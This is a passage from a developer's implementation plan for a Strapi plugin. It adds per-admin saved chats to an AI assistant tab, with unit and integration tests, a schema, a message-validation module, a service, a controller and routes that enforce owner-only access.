      expect(others.ctx.body).toEqual({ error: { message: NO_CHAT, details: { code: 'not_found', hint: 'Reload the page: it may have been deleted.' } } });
      expect(missing.ctx.body).toEqual(others.ctx.body);
      expect(others.rows.get('c1')).toMatchObject({ adminUserId: 8, title: 'Which visits are waiting?' });
    });
  });

  describe('a body that cannot be saved', () => {
    it.each([['undefined', undefined], ['text', 'hello'], ['a list', []], ['no messages', { title: 'x' }], ['messages in the wrong shape', { messages: [{ id: 'm1', role: 'wizard', parts: [] }] }]])(
      'is a 400 with a staff text for create: %s',
      async (_what, body) => {
        const { controller, rows } = chatsWorld();
        const ctx = fakeCtx({ admin: 7, body });
        await controller.create(ctx);
        expect(ctx.status).toBe(400);
        expect(ctx.body).toEqual({ error: { message: NOT_SAVED, details: { code: 'invalid_input', hint: 'Start a new chat and try again.' } } });
        expect(rows.size).toBe(0);
      }
    );

    it('is a 400 for update, and writes nothing', async () => {
      const { controller, called } = chatsWorld([savedRow('c1', 7)]);
      const ctx = fakeCtx({ admin: 7, params: { documentId: 'c1' }, body: { messages: 'hello' } });
      await controller.update(ctx);
      expect(ctx.status).toBe(400);
      expect(called('update')).toEqual([]);
    });
  });

  describe('a request with no signed-in admin', () => {
    it.each(['list', 'findOne', 'create', 'update', 'remove'] as const)('is a 401 for %s, and reaches no chat', async (handler) => {
      const { controller, called } = chatsWorld([savedRow('c1', 7)]);
      const ctx = fakeCtx({ admin: null, params: { documentId: 'c1' }, body: { title: 'x', messages: CHAT } });
      await controller[handler](ctx);
      expect(ctx.unauthorized).toHaveBeenCalledOnce();
      expect(ctx.status).toBe(401);
      expect(called('findMany') ?? []).toEqual([]);
      expect(called('create')).toEqual([]);
      expect(called('update')).toEqual([]);
      expect(called('delete')).toEqual([]);
    });

    it('is a 401 for an id that is not a number: only a real admin session counts', async () => {
      const { controller } = chatsWorld([savedRow('c1', 7)]);
      const ctx = fakeCtx({ admin: null });
      ctx.state = { user: { id: '7' } };
      await controller.list(ctx);
      expect(ctx.status).toBe(401);
    });
  });
});

describe('the saved chats routes', () => {
  const gate = (action: string) => ['admin::isAuthenticatedAdmin', { name: 'admin::hasPermissions', config: { actions: [action] } }];
  const routeOf = (method: string, path: string) => routes.admin.routes.find((route) => route.method === method && route.path === path);

  it.each([
    ['GET', '/conversations', 'conversations.list'],
    ['POST', '/conversations', 'conversations.create'],
    ['GET', '/conversations/:documentId', 'conversations.findOne'],
    ['PUT', '/conversations/:documentId', 'conversations.update'],
    ['DELETE', '/conversations/:documentId', 'conversations.remove'],
  ])('send %s %s to %s, for admins who hold the assistant permission', (method, path, handler) => {
    expect(routeOf(method, path)).toEqual({ method, path, handler, config: { policies: gate(ACTION.assistantUse) } });
  });

  it('are five, and all of them need the assistant permission and nothing less', () => {
    const chats = routes.admin.routes.filter((route) => route.path.startsWith('/conversations'));
    expect(chats).toHaveLength(5);
    for (const route of chats) expect(route.config.policies, `${route.method} ${route.path}`).toEqual(gate('plugin::maison.assistant.use'));
  });

  it('name controller actions that exist', () => {
    const instance = (controllers as Doc).conversations({ strapi: fakeStrapi() });
    for (const action of ['list', 'findOne', 'create', 'update', 'remove']) expect(typeof instance[action], action).toBe('function');
  });
});
```

`test/unit/admin-routes.test.ts`: the route count goes from 19 to 24, the five routes are checked, and the test that keeps the inquiries routes in order looks only at the inquiries routes.

```diff
@@
 
   it('each require a signed-in admin with the matching Maison permission', () => {
     expect(routes.admin.type).toBe('admin');
-    expect(routes.admin.routes).toHaveLength(19);
+    expect(routes.admin.routes).toHaveLength(24);
     expect(policiesOf('GET', '/appointments')).toEqual(gate('plugin::maison.appointments.review'));
     expect(policiesOf('GET', '/appointments/summary')).toEqual(gate('plugin::maison.appointments.review'));
     expect(policiesOf('POST', '/appointments/:reference/confirm')).toEqual(gate('plugin::maison.appointments.confirm'));
@@
     // The Ask tab's two routes, for admins who hold "Use the Maison assistant".
     expect(policiesOf('GET', '/assistant/status')).toEqual(gate('plugin::maison.assistant.use'));
     expect(policiesOf('POST', '/assistant/chat')).toEqual(gate('plugin::maison.assistant.use'));
+    // The Ask tab's saved chats: the same permission as the chat. Each admin sees only their own.
+    expect(policiesOf('GET', '/conversations')).toEqual(gate('plugin::maison.assistant.use'));
+    expect(policiesOf('POST', '/conversations')).toEqual(gate('plugin::maison.assistant.use'));
+    expect(policiesOf('GET', '/conversations/:documentId')).toEqual(gate('plugin::maison.assistant.use'));
+    expect(policiesOf('PUT', '/conversations/:documentId')).toEqual(gate('plugin::maison.assistant.use'));
+    expect(policiesOf('DELETE', '/conversations/:documentId')).toEqual(gate('plugin::maison.assistant.use'));
     expect(policiesOf('POST', '/demo/seed')).toEqual(gate('plugin::maison.demo.manage'));
     expect(policiesOf('POST', '/demo/reset')).toEqual(gate('plugin::maison.demo.manage'));
     expect(policiesOf('POST', '/demo/activity')).toEqual(gate('plugin::maison.demo.manage'));
@@
     }
   );
 
-  it('list the inquiries summary and quota ahead of every route that takes a :documentId, whatever its method', () => {
+  it('list the inquiries summary and quota ahead of every inquiry route that takes a :documentId, whatever its method', () => {
     const at = (path: string) => routes.admin.routes.findIndex((route) => route.path === path);
-    const withId = routes.admin.routes.flatMap((route, index) => (route.path.includes(':documentId') ? [index] : []));
+    const withId = routes.admin.routes.flatMap((route, index) => (route.path.startsWith('/inquiries') && route.path.includes(':documentId') ? [index] : []));
     expect(withId).toHaveLength(4);
     for (const path of ['/inquiries/summary', '/inquiries/quota']) {
       expect(at(path), path).toBeGreaterThanOrEqual(0);
```

`test/unit/seed.test.ts`: a new block for the saved chats, inside the existing `describe` for the reset.

```diff
@@
     expect(deletions(calls).map(([uid]) => uid)).toEqual([KNOWLEDGE, KNOWLEDGE]);
   });
 
+  describe('the saved chats of the Ask tab', () => {
+    const CONVERSATION = 'plugin::maison.conversation';
+    const chats = (count: number) => Array.from({ length: count }, (_, index) => ({ documentId: `c${index + 1}` }));
+    const chatDeletions = (calls: Call[]) => deletions(calls).flatMap(([uid, params]) => (uid === CONVERSATION ? [(params as { documentId: string }).documentId] : []));
+    const chatReads = (calls: Call[]) => calls.filter(({ uid, method }) => uid === CONVERSATION && method === 'findMany');
+
+    it('deletes every one of them, every admin\'s, after the appointments, and does not count them in its answer', async () => {
+      const { strapi, calls } = strapiHolding({ ...REHEARSAL, [CONVERSATION]: chats(3) });
+      expect(await seedService({ strapi }).resetDemoAppointments()).toEqual({ appointments: 3, notifications: 2, questions: 3, inquiries: 3, knowledge: 2 });
+      expect(chatDeletions(calls)).toEqual(['c1', 'c2', 'c3']);
+      const order = deletions(calls).map(([uid]) => uid);
+      expect(order.indexOf(CONVERSATION)).toBeGreaterThan(order.lastIndexOf(APPOINTMENT));
+    });
+
+    it('reads them with no filter, as many at a time as the other content types, until none are left', async () => {
+      const { strapi, calls } = strapiHolding({ ...REHEARSAL, [CONVERSATION]: chats(5001) });
+      await seedService({ strapi }).resetDemoAppointments();
+      expect(chatDeletions(calls)).toHaveLength(5001);
+      expect(chatReads(calls).map(({ returned }) => returned)).toEqual([5000, 1, 0]);
+      for (const { params } of chatReads(calls)) expect(params).toEqual({ fields: ['documentId'], limit: 5000 });
+    });
+
+    it('has nothing to delete when no admin has a chat', async () => {
+      const { strapi, calls } = strapiHolding(REHEARSAL);
+      await seedService({ strapi }).resetDemoAppointments();
+      expect(chatDeletions(calls)).toEqual([]);
+      expect(chatReads(calls).map(({ returned }) => returned)).toEqual([0]);
+    });
+
+    it('stops with the chat that is still there after it was deleted, instead of reading it again for ever', async () => {
+      const { strapi } = strapiHolding({ ...REHEARSAL, [CONVERSATION]: chats(3) }, { stuck: ['c2'] });
+      await expect(seedService({ strapi }).resetDemoAppointments()).rejects.toThrow('Saved chat c2 is still there after it was deleted, so the reset stops.');
+    });
+
+    it('stops at a chat that will not delete', async () => {
+      const { strapi, calls } = strapiHolding({ ...REHEARSAL, [CONVERSATION]: chats(3) }, { failing: ['c2'] });
+      await expect(seedService({ strapi }).resetDemoAppointments()).rejects.toThrow('could not delete c2');
+      expect(chatDeletions(calls)).toEqual(['c1', 'c2']);
+    });
+  });
+
   describe('with more inquiries than one read holds', () => {
     /** `count` inquiries: i1, i2 and so on. */
     const inquiries = (count: number) => Array.from({ length: count }, (_, index) => ({ documentId: `i${index + 1}` }));
```

Create `test/integration/assistant-conversations.test.mjs`. It is run in Step 8, after the build, because the app loads the plugin from `dist/`.

```js
import assert from 'node:assert/strict';
import { after, before, describe, it } from 'node:test';

import { bootStrapi } from './harness.mjs';

const CONVERSATION = 'plugin::maison.conversation';
const NO_CHAT = 'There is no saved chat with that ID.';
const NOT_SAVED = 'This chat could not be saved.';

/** The messages of a chat as the page saves them: TanStack AI's UIMessage, with the parts a real chat has. */
const CHAT = [
  { id: 'u1', role: 'user', parts: [{ type: 'text', content: '今日のお客様からの問い合わせは? 😀' }] },
  {
    id: 'a1',
    role: 'assistant',
    createdAt: '2026-10-07T01:02:03.000Z',
    parts: [
      { type: 'thinking', content: 'Let me look.', signature: 'EqQBCkYIBRgCIkD+/=', providerMetadata: { anthropic: { index: 0 } } },
      { type: 'text', content: 'Looking.\n\n| a | b |\n| - | - |\n| 1 | 2 |' },
      { type: 'tool-call', id: 'c1', name: 'list_inquiries', arguments: '{}', state: 'complete', input: {}, output: { inquiries: [{ documentId: 'k1', customer: 'line:U4af…88', message: '<customer_message>Hello</customer_message>' }], capped: false } },
      { type: 'tool-result', toolCallId: 'c1', content: '{"inquiries":[]}', state: 'complete' },
      { type: 'structured-output', status: 'complete', raw: '{}', data: { nested: [1, [2, { three: null }]], line: 'a b' } },
    ],
  },
];

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

/** A Koa context with what the controller reads, and Strapi's error helpers, which the HTTP stack adds and a direct call lacks. */
const ctxFor = (admin, { params = {}, body } = {}) => {
  const ctx = { state: admin === null ? {} : { user: { id: admin } }, params, request: { body }, status: 200, body: undefined };
  for (const [helper, status] of Object.entries({ badRequest: 400, unauthorized: 401, notFound: 404 })) {
    ctx[helper] = (message, details) => {
      ctx.status = status;
      ctx.body = { error: { message, details } };
    };
  }
  return ctx;
};

describe('the Ask tab\'s saved chats, on a real Strapi', () => {
  let strapi;
  let chats;
  let seed;

  /** Runs one of the controller's handlers as `admin`, and answers the context it left. */
  const call = async (handler, admin, options) => {
    const ctx = ctxFor(admin, options);
    await chats[handler](ctx);
    return ctx;
  };
  const stored = () => strapi.documents(CONVERSATION).findMany({ limit: 500 });

  before(async () => {
    strapi = await bootStrapi('assistant-conversations');
    chats = strapi.plugin('maison').controller('conversations');
    seed = strapi.plugin('maison').service('seed');
  });
  after(async () => {
    await strapi?.destroy();
  });

  it('is a content type that Strapi loaded, hidden from the Content Manager and the Content-Type Builder', () => {
    const type = strapi.contentTypes[CONVERSATION];
    assert.ok(type, 'plugin::maison.conversation is loaded');
    assert.equal(type.collectionName, 'maison_conversations');
    assert.equal(type.options.draftAndPublish, false);
    assert.equal(type.pluginOptions['content-manager'].visible, false);
    assert.equal(type.pluginOptions['content-type-builder'].visible, false);
  });

  it('saves a chat, lists it and opens it, and every key of every part comes back as it was saved', async () => {
    const created = await call('create', 1, { body: { title: '今日のお客様からの問い合わせは? 😀', messages: CHAT } });
    assert.equal(created.status, 201);
    const { documentId, title } = created.body.conversation;
    assert.equal(title, '今日のお客様からの問い合わせは? 😀');
    assert.deepEqual(Object.keys(created.body.conversation).sort(), ['documentId', 'title', 'updatedAt']);

    const listed = await call('list', 1);
    assert.deepEqual(listed.body.conversations.map((chat) => chat.documentId), [documentId]);

    const opened = await call('findOne', 1, { params: { documentId } });
    assert.equal(opened.status, 200);
    assert.deepEqual(opened.body.conversation.messages, CHAT);
    // In the database it is the envelope.
    const row = await strapi.documents(CONVERSATION).findOne({ documentId });
    assert.deepEqual(row.messages, { v: 1, messages: CHAT });
    assert.equal(row.adminUserId, 1);
  });

  it("keeps one admin's chat from another: it is not in their list, and opening, saving and deleting it answer 404, as an ID nobody has does", async () => {
    const mine = (await call('create', 11, { body: { title: 'Mine', messages: CHAT } })).body.conversation.documentId;

    assert.deepEqual((await call('list', 12)).body.conversations, []);
    const message = { message: NO_CHAT, details: { code: 'not_found', hint: 'Reload the page: it may have been deleted.' } };
    for (const [handler, options] of [
      ['findOne', {}],
      ['update', { body: { title: 'Theirs now' } }],
      ['remove', {}],
    ]) {
      const theirs = await call(handler, 12, { ...options, params: { documentId: mine } });
      const nobody = await call(handler, 12, { ...options, params: { documentId: 'no-such-chat' } });
      assert.equal(theirs.status, 404, handler);
      assert.deepEqual(theirs.body, { error: message }, handler);
      assert.deepEqual(nobody.body, theirs.body, handler);
    }

    // Nothing of it changed, and its admin still has it.
    const row = await strapi.documents(CONVERSATION).findOne({ documentId: mine });
    assert.equal(row.title, 'Mine');
    assert.equal(row.adminUserId, 11);
    assert.equal((await call('findOne', 11, { params: { documentId: mine } })).status, 200);
  });

  it('takes the admin from the session, never from the body', async () => {
    const created = await call('create', 13, { body: { title: 'x', messages: CHAT, adminUserId: 99 } });
    const row = await strapi.documents(CONVERSATION).findOne({ documentId: created.body.conversation.documentId });
    assert.equal(row.adminUserId, 13);
    await call('update', 13, { params: { documentId: row.documentId }, body: { adminUserId: 99, title: 'y' } });
    assert.equal((await strapi.documents(CONVERSATION).findOne({ documentId: row.documentId })).adminUserId, 13);
  });

  it('answers 400 with a staff text for a body that is not a chat, and saves nothing', async () => {
    const before = (await stored()).length;
    for (const body of [undefined, 'hello', [], { title: 'x' }, { title: 'x', messages: 'hello' }, { title: 'x', messages: [{ id: 'm1', role: 'wizard', parts: [] }] }]) {
      const created = await call('create', 14, { body });
      assert.equal(created.status, 400, JSON.stringify(body));
      assert.equal(created.body.error.message, NOT_SAVED);
      assert.equal(created.body.error.details.code, 'invalid_input');
    }
    assert.equal((await stored()).length, before);

    const id = (await call('create', 14, { body: { title: 'Keep', messages: CHAT } })).body.conversation.documentId;
    const bad = await call('update', 14, { params: { documentId: id }, body: { title: 'Lost', messages: 'hello' } });
    assert.equal(bad.status, 400);
    const row = await strapi.documents(CONVERSATION).findOne({ documentId: id });
    assert.equal(row.title, 'Keep');
    assert.deepEqual(row.messages, { v: 1, messages: CHAT });
  });

  it('lists the newest first: a chat saved again moves to the top', async () => {
    const admin = 15;
    const ids = [];
    for (const title of ['First', 'Second', 'Third']) {
      ids.push((await call('create', admin, { body: { title, messages: CHAT } })).body.conversation.documentId);
      await sleep(15);
    }
    assert.deepEqual((await call('list', admin)).body.conversations.map((chat) => chat.title), ['Third', 'Second', 'First']);

    await call('update', admin, { params: { documentId: ids[0] }, body: { messages: [...CHAT, { id: 'u2', role: 'user', parts: [{ type: 'text', content: 'More' }] }] } });
    assert.deepEqual((await call('list', admin)).body.conversations.map((chat) => chat.title), ['First', 'Third', 'Second']);
  });

  it('lists at most 100 chats: the newest', async () => {
    const admin = 16;
    for (let index = 0; index < 101; index += 1) {
      await strapi.documents(CONVERSATION).create({ data: { title: `Chat ${String(index).padStart(3, '0')}`, messages: { v: 1, messages: [] }, adminUserId: admin } });
      // updatedAt has the precision of a millisecond: each chat gets a moment of its own, so "newest" has one answer.
      await sleep(2);
    }
    const { conversations } = (await call('list', admin)).body;
    assert.equal(conversations.length, 100);
    assert.equal(conversations[0].title, 'Chat 100');
    assert.ok(!conversations.some((chat) => chat.title === 'Chat 000'));
  });

  it('cuts a long title to 80 characters, and never splits an emoji or a Japanese character', async () => {
    const created = await call('create', 17, { body: { title: '😀'.repeat(100), messages: CHAT } });
    assert.equal(created.body.conversation.title, '😀'.repeat(80));
    const japanese = '今日のお客様からの問い合わせを教えてください。'.repeat(5);
    const second = await call('create', 17, { body: { title: japanese, messages: CHAT } });
    assert.equal(Array.from(second.body.conversation.title).length, 80);
    assert.ok(japanese.startsWith(second.body.conversation.title));
  });

  it('opens a chat whose stored messages cannot be read as an empty chat, and leaves the stored value alone', async () => {
    const row = await strapi.documents(CONVERSATION).create({ data: { title: 'Damaged', messages: { v: 9, other: 'shape' }, adminUserId: 18 } });
    const opened = await call('findOne', 18, { params: { documentId: row.documentId } });
    assert.equal(opened.status, 200);
    assert.deepEqual(opened.body.conversation.messages, []);
    assert.deepEqual((await strapi.documents(CONVERSATION).findOne({ documentId: row.documentId })).messages, { v: 9, other: 'shape' });
  });

  it('deletes a chat at once', async () => {
    const id = (await call('create', 19, { body: { title: 'Gone', messages: CHAT } })).body.conversation.documentId;
    const removed = await call('remove', 19, { params: { documentId: id } });
    assert.deepEqual(removed.body, { documentId: id });
    assert.equal(await strapi.documents(CONVERSATION).findOne({ documentId: id }), null);
  });

  it("is cleared by Reset demo activity: every admin's chats, and nothing else of the answer changes", async () => {
    assert.ok((await stored()).length > 0, 'there are chats to clear');
    assert.deepEqual(await seed.resetDemoAppointments(), { appointments: 0, notifications: 0, questions: 0, inquiries: 0, knowledge: 0 });
    assert.equal(await strapi.documents(CONVERSATION).count(), 0);
    assert.deepEqual((await call('list', 1)).body.conversations, []);
  });
});
```

- [ ] **Step 2: Run the unit tests to see them fail**

Run: `npm test -- test/unit/constants.test.ts test/unit/conversation-schema.test.ts test/unit/assistant-stored-messages.test.ts test/unit/assistant-conversations.test.ts test/unit/admin-routes.test.ts test/unit/seed.test.ts`
Expected: FAIL, `Test Files  6 failed (6)` and `Tests  7 failed | 375 passed (382)`. The content type, the constants, the check, the service, the controller and the routes do not exist yet.

- [ ] **Step 3: Declare the constants and the content type**

`server/src/constants.ts`:

```diff
@@
   knowledge: 'plugin::maison.knowledge',
   question: 'plugin::maison.question',
   inquiry: 'plugin::maison.inquiry',
+  conversation: 'plugin::maison.conversation',
 } as const;
 
 /** Full action UIDs, as stored on admin tokens and checked by tool auth policies. */
@@
   listTextChars: 300,
   /** The longest draft, in characters. The dialogs and the server take the same. */
   draftChars: 2000,
+} as const;
+
+/** The Ask tab's saved chats. */
+export const SAVED_CHATS = {
+  /** The most chats the sidebar lists for one admin, newest first. */
+  listRows: 100,
+  /** The longest title, in characters. The title is the first staff message, cut. */
+  titleChars: 80,
 } as const;
 
 export const TOOL_NAMES = [
```

Create `server/src/content-types/conversation/schema.json`. It is hidden from the Content Manager and the Content-Type Builder, as the `question` type is, and has no draft and publish.

```json
{
  "kind": "collectionType",
  "collectionName": "maison_conversations",
  "info": {
    "singularName": "conversation",
    "pluralName": "conversations",
    "displayName": "Maison assistant chat",
    "description": "A chat in the Ask tab of the Maison page, saved for the admin who had it. Only that admin can read it."
  },
  "options": { "draftAndPublish": false },
  "pluginOptions": { "content-manager": { "visible": false }, "content-type-builder": { "visible": false } },
  "attributes": {
    "title": { "type": "text", "required": true },
    "messages": { "type": "json", "required": true },
    "adminUserId": { "type": "integer", "required": true }
  }
}
```

Create `server/src/content-types/conversation/index.ts`:

```ts
import schema from './schema.json';

export default { schema };
```

`server/src/content-types/index.ts`:

```diff
@@
 import appointment from './appointment';
 import boutique from './boutique';
 import collection from './collection';
+import conversation from './conversation';
 import inquiry from './inquiry';
 import knowledge from './knowledge';
 import notification from './notification';
@@
   knowledge,
   question,
   inquiry,
+  conversation,
 };
```

- [ ] **Step 4: Write the stored-body check**

`stored-messages.ts` is adapted from the reference's `stored-messages.ts`: a versioned envelope, a part this version does not know is kept and not refused, and reading is total. The one difference is that every part is a loose object, which keeps every key it has, as the Decisions above say.

Create `server/src/assistant/stored-messages.ts`:

```ts
import { z } from '@strapi/utils';

/**
 * What a saved chat's `messages` field holds, and the check that keeps it so. The field is JSON, so Strapi stores whatever it is given and
 * checks nothing: without this the stored shape would be whatever the page sent, and a bad body would corrupt a chat that nothing can read
 * back. Adapted from strapi-plugin-tanstack-ai 1.6.0 (`stored-messages.ts`), with three rules kept:
 * - A versioned envelope, `{ v: 1, messages }`, so a later change of the shape can be told from this one.
 * - A part this version does not know is kept, not refused: dropping it would damage the chat for a version that does.
 * - Reading is total. A stored value that cannot be read gives no messages and an error to log, and never throws: a damaged chat costs
 *   staff that chat, not the page.
 *
 * It differs from the reference in one place that matters: every part is a loose object, so it keeps every key it has. The page sends the
 * whole history back to the model each turn, thinking parts with their signatures included, and Anthropic refuses a history whose signed
 * thinking block was changed. The reference can store less because its server sends the model text only.
 */

export const STORAGE_VERSION = 1;

const textPart = z.looseObject({ type: z.literal('text'), content: z.string() });
const thinkingPart = z.looseObject({ type: z.literal('thinking'), content: z.string() });
const toolCallPart = z.looseObject({ type: z.literal('tool-call'), id: z.string(), name: z.string() });
const toolResultPart = z.looseObject({ type: z.literal('tool-result'), toolCallId: z.string() });
/** Any part the page sends now or later. Kept as it is. */
const otherPart = z.looseObject({ type: z.string() });

export const uiMessageSchema = z.looseObject({
  id: z.string().min(1),
  role: z.enum(['user', 'assistant', 'system']),
  parts: z.array(z.union([textPart, thinkingPart, toolCallPart, toolResultPart, otherPart])),
});

export const storedMessagesSchema = z.object({ v: z.literal(STORAGE_VERSION), messages: z.array(uiMessageSchema) });

export type StoredMessages = z.infer<typeof storedMessagesSchema>;

/**
 * Server TypeScript is not strict, so a union is not narrowed by `if (!result.ok)`: this is one interface with optional fields, which
 * the compiler follows.
 */
export interface ToStoredResult {
  ok: boolean;
  value?: StoredMessages;
  error?: string;
}

/** The messages the page sent, checked and wrapped for storage. */
export const toStoredMessages = (messages: unknown): ToStoredResult => {
  const checked = storedMessagesSchema.safeParse({ v: STORAGE_VERSION, messages });
  if (checked.success) return { ok: true, value: checked.data };
  const issue = checked.error.issues[0];
  return { ok: false, error: issue ? `${issue.path.join('.') || 'messages'}: ${issue.message}` : 'invalid messages' };
};

/** What is stored, as messages for the page. Total: a value that cannot be read gives no messages, and `error` says why. */
export const readStoredMessages = (stored: unknown): { messages: StoredMessages['messages']; error?: string } => {
  if (stored === null || stored === undefined) return { messages: [] };
  const checked = storedMessagesSchema.safeParse(stored);
  if (checked.success) return { messages: checked.data.messages };
  return { messages: [], error: `unrecognised shape: ${checked.error.issues[0]?.message ?? 'unknown'}` };
};
```

- [ ] **Step 5: Write the service, the controller and the routes**

`conversations.ts` (the service) does the owner check in one place, `owned`: it reads the row and answers it only when its `adminUserId` is the admin's. Every method uses it, and a list filters on the admin. The controller reads the admin from `ctx.state.user.id`. The route's policy never lets a request without one through, but if one arrives the controller answers 401. The routes are the reference's list, get, create, update and delete, under the assistant permission.

Create `server/src/services/conversations.ts`:

```ts
import type { Core } from '@strapi/strapi';

import { SAVED_CHATS, UID } from '../constants';
import { toStoredMessages, readStoredMessages, type StoredMessages } from '../assistant/stored-messages';
import { failure, type ServiceResult } from '../domain/service-result';

/** What the sidebar lists of a chat: no messages, so a long history stays a short answer. */
export interface SavedChatRow {
  documentId: string;
  title: string;
  updatedAt: string;
}

/** A chat as the page opens it. */
export interface SavedChat extends SavedChatRow {
  createdAt: string;
  messages: StoredMessages['messages'];
}

/** What the page saves: the title is cut to its limit, and the messages are checked. */
export interface SaveInput {
  title?: unknown;
  messages?: unknown;
}

const NO_CHAT = 'There is no saved chat with that ID.';
const NO_CHAT_HINT = 'Reload the page: it may have been deleted.';
const NOT_SAVED = 'This chat could not be saved.';
const NOT_SAVED_HINT = 'Start a new chat and try again.';

/** The title staff see in the sidebar: the words on one line, cut to its limit by characters, so an emoji or a Japanese character is never split. */
export const cutTitle = (title: unknown): string => {
  const text = typeof title === 'string' ? title.replace(/\s+/g, ' ').trim() : '';
  return text === '' ? 'New chat' : Array.from(text).slice(0, SAVED_CHATS.titleChars).join('');
};

/**
 * The Ask tab's saved chats. Every method takes the admin it is for, and answers only for that admin's own chats: a chat that belongs to
 * someone else is answered as one that is not there (`not_found`), the same words as for an ID nobody has, so the answer never confirms
 * that it exists.
 */
export default ({ strapi }: { strapi: Core.Strapi }) => {
  const documents = () => strapi.documents(UID.conversation);

  /** The row, when this admin owns it. */
  const owned = async (adminId: number, documentId: string) => {
    const row = (await documents().findOne({ documentId })) as { adminUserId?: number } | null;
    return row && row.adminUserId === adminId ? row : null;
  };

  const summary = (row: any): SavedChatRow => ({ documentId: row.documentId, title: row.title, updatedAt: row.updatedAt });

  return {
    /** The admin's chats, newest first, at most 100. */
    async list(adminId: number): Promise<SavedChatRow[]> {
      const rows = (await documents().findMany({
        filters: { adminUserId: { $eq: adminId } },
        fields: ['title', 'updatedAt'],
        sort: { updatedAt: 'desc' },
        limit: SAVED_CHATS.listRows,
      })) as any[];
      return rows.map(summary);
    },

    /** One chat with its messages. A stored value that cannot be read opens as an empty chat, and the log says which one. */
    async view(adminId: number, documentId: string): Promise<ServiceResult<SavedChat>> {
      const row: any = await owned(adminId, documentId);
      if (!row) return failure('not_found', NO_CHAT, NO_CHAT_HINT);
      const { messages, error } = readStoredMessages(row.messages);
      if (error) strapi.log.warn(`[maison] Saved chat ${documentId} has messages that can't be read (${error}), so it opens empty. The stored value is left as it is.`);
      return { ok: true, value: { ...summary(row), createdAt: row.createdAt, messages } };
    },

    /** Saves a new chat for the admin. The admin is the one signed in, whatever the body says. */
    async create(adminId: number, input: SaveInput): Promise<ServiceResult<SavedChatRow>> {
      const stored = toStoredMessages(input.messages);
      if (!stored.ok) return failure('invalid_input', NOT_SAVED, NOT_SAVED_HINT);
      const row = await documents().create({ data: { title: cutTitle(input.title), messages: stored.value as never, adminUserId: adminId } });
      return { ok: true, value: summary(row) };
    },

    /** Saves a chat the admin owns again: the title, the messages, or both. Nothing is written when the body is not valid. */
    async update(adminId: number, documentId: string, input: SaveInput): Promise<ServiceResult<SavedChatRow>> {
      if (!(await owned(adminId, documentId))) return failure('not_found', NO_CHAT, NO_CHAT_HINT);
      const data: Record<string, unknown> = {};
      if (input.title !== undefined) data.title = cutTitle(input.title);
      if (input.messages !== undefined) {
        const stored = toStoredMessages(input.messages);
        if (!stored.ok) return failure('invalid_input', NOT_SAVED, NOT_SAVED_HINT);
        data.messages = stored.value;
      }
      const row = await documents().update({ documentId, data: data as never });
      return { ok: true, value: summary(row) };
    },

    /** Deletes a chat the admin owns, at once. */
    async remove(adminId: number, documentId: string): Promise<ServiceResult<{ documentId: string }>> {
      if (!(await owned(adminId, documentId))) return failure('not_found', NO_CHAT, NO_CHAT_HINT);
      await documents().delete({ documentId });
      return { ok: true, value: { documentId } };
    },
  };
};
```

Create `server/src/controllers/conversations.ts`:

```ts
import type { Core } from '@strapi/strapi';

import type { ServiceFailure } from '../domain/service-result';

/** What a body that is not an object is, for the service to refuse. */
const asBody = (body: unknown): { title?: unknown; messages?: unknown } => (typeof body === 'object' && body !== null && !Array.isArray(body) ? body : {});

/**
 * The Ask tab's saved chats: list, open, save, save again and delete. The routes are for admins who hold assistant.use, and every one is for
 * the signed-in admin's own chats: the admin comes from the session, never from the request, and a chat that belongs to someone else is a 404.
 */
export default ({ strapi }: { strapi: Core.Strapi }) => {
  const conversations = () => strapi.plugin('maison').service('conversations');

  /** The signed-in admin's id, or null: the route's policy lets only signed-in admins through, so null is not expected. */
  const adminOf = (ctx): number | null => (typeof ctx.state?.user?.id === 'number' ? ctx.state.user.id : null);

  /** The service's failure in Strapi's error body: 404 for a chat that is not there, 400 for a body that cannot be saved. */
  const fail = (ctx, { code, message, hint }: ServiceFailure) => (code === 'not_found' ? ctx.notFound(message, { code, hint }) : ctx.badRequest(message, { code, hint }));

  return {
    /** GET /conversations: `{ conversations: [{ documentId, title, updatedAt }] }`, newest first. */
    async list(ctx) {
      const admin = adminOf(ctx);
      if (admin === null) return ctx.unauthorized();
      ctx.body = { conversations: await conversations().list(admin) };
    },

    /** GET /conversations/:documentId: `{ conversation }` with its messages. */
    async findOne(ctx) {
      const admin = adminOf(ctx);
      if (admin === null) return ctx.unauthorized();
      const result = await conversations().view(admin, ctx.params.documentId);
      if (result.ok === false) return fail(ctx, result);
      ctx.body = { conversation: result.value };
    },

    /** POST /conversations, with `{ title, messages }`: saves a new chat. */
    async create(ctx) {
      const admin = adminOf(ctx);
      if (admin === null) return ctx.unauthorized();
      const result = await conversations().create(admin, asBody(ctx.request.body));
      if (result.ok === false) return fail(ctx, result);
      ctx.status = 201;
      ctx.body = { conversation: result.value };
    },

    /** PUT /conversations/:documentId, with `{ title, messages }`, either or both: saves the chat again. */
    async update(ctx) {
      const admin = adminOf(ctx);
      if (admin === null) return ctx.unauthorized();
      const result = await conversations().update(admin, ctx.params.documentId, asBody(ctx.request.body));
      if (result.ok === false) return fail(ctx, result);
      ctx.body = { conversation: result.value };
    },

    /** DELETE /conversations/:documentId: deletes the chat at once. */
    async remove(ctx) {
      const admin = adminOf(ctx);
      if (admin === null) return ctx.unauthorized();
      const result = await conversations().remove(admin, ctx.params.documentId);
      if (result.ok === false) return fail(ctx, result);
      ctx.body = result.value;
    },
  };
};
```

`server/src/services/index.ts`:

```diff
@@
 import assistant from './assistant';
 import catalog from './catalog';
 import confirmations from './confirmations';
+import conversations from './conversations';
 import errors from './errors';
 import identity from './identity';
 import inquiries from './inquiries';
@@
   assistant,
   catalog,
   confirmations,
+  conversations,
   errors,
   identity,
   inquiries,
```

`server/src/controllers/index.ts`:

```diff
@@
 import assistant from './assistant';
 import boutiques from './boutiques';
 import collections from './collections';
+import conversations from './conversations';
 import customer from './customer';
 import demo from './demo';
 import inquiries from './inquiries';
@@
 import products from './products';
 import questions from './questions';
 
-export default { appointments, assistant, boutiques, collections, customer, demo, inquiries, knowledge, products, questions };
+export default { appointments, assistant, boutiques, collections, conversations, customer, demo, inquiries, knowledge, products, questions };
```

`server/src/routes/index.ts`: add these five routes after the assistant routes.

```diff
@@
       // The Ask tab: whether the assistant is ready, and one chat turn. Both need the permission "Use the Maison assistant".
       { method: 'GET', path: '/assistant/status', handler: 'assistant.status', config: { policies: allow(ACTION.assistantUse) } },
       { method: 'POST', path: '/assistant/chat', handler: 'assistant.chat', config: { policies: allow(ACTION.assistantUse) } },
